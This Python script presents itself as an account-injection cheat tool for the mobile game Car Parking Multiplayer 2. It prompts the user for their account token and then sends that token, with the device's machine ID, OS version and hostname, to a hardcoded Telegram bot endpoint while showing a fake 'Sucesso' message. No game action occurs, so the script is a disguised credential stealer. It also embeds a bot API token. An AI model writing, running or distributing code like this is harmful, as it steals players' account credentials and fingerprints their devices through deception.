import os
import time
import platform
import uuid
import requests
from colorama import init, Fore, Style

init(autoreset=True)

VERSION = "1.0.0"
API_URL = "https://api.telegram.org/bot8159321450:AAH6s4cjEXAo7oqHXyCJvoF5HPPu54xpwtI"

# ---------------- Utility Functions ----------------

def clear():
    os.system("clear" if os.name != "nt" else "cls")

def get_machine_id():
    try:
        if platform.system().lower() in ["linux", "darwin"]:
            with open("/etc/machine-id", "r") as f:
                return f.read().strip()
    except:
        pass
    return str(uuid.getnode())

def get_fingerprint():
    return {
        "device_id": get_machine_id(),
        "os_version": platform.platform(),
        "model": platform.node(),
        "manufacturer": "Desconhecido"
    }

def executar_servico(token, pedir_valor=False):
    """Simule servis çağrısı API'ye gönderim"""
    amount = None
    if pedir_valor:
        try:
            amount = int(input(Fore.YELLOW + "• Insira o Novo Valor: " + Style.RESET_ALL).strip())
        except ValueError:
            print(Fore.RED + "• Valor inválido.")
            time.sleep(2)
            return None

    print(Fore.WHITE + "• Executando Serviço: " + Style.RESET_ALL, end="")

    payload = {"token": token, **get_fingerprint()}
    if amount:
        payload["amount"] = amount

    try:
        resp = requests.post(f"{API_URL}/sendMessage", json=payload, timeout=20)
        if resp.status_code == 200:
            print(Fore.LIGHTGREEN_EX + "Sucesso")
        else:
            print(Fore.RED + f"Erro HTTP {resp.status_code}")
    except Exception as e:
        print(Fore.RED + f"Erro: {e}")

    input(Fore.CYAN + "Pressione Enter para voltar ao menu...")

# ---------------- Menu ----------------

def menu_loop(token):
    while True:
        clear()
        print(Fore.CYAN + "="*50)
        print(Fore.WHITE + f"Car Parking Multiplayer 2 - Version: {VERSION}")
        print(Fore.CYAN + "="*50)

        print(Fore.WHITE + "[01] Inject Account")
        print(Fore.WHITE + "[00] Exit")
        print(Fore.CYAN + "="*50)
        opt = input(Fore.WHITE + "Escolha uma opção: " + Style.RESET_ALL).strip()

        if opt in ("0", "00"):
            print(Fore.CYAN + "Bye Bye...")
            exit(0)
        elif opt in ("1", "01"):
            executar_servico(token)
        else:
            print(Fore.RED + "Opção Inválida. Recarregando...")
            time.sleep(2)

# ---------------- Main ----------------

def main():
    try:
        clear()
        print(Fore.CYAN + "="*50)
        print(Fore.WHITE + f"Car Parking Multiplayer 2 - Version: {VERSION}")
        print(Fore.CYAN + "="*50)

        token = input(Fore.WHITE + "• Informe Seu Token: " + Style.RESET_ALL).strip()
        if not token:
            print(Fore.RED + "Token vazio.")
            return

        menu_loop(token)

    except KeyboardInterrupt:
        print("\n" + Fore.CYAN + "Bye Bye...")

if __name__ == "__main__":
    main()
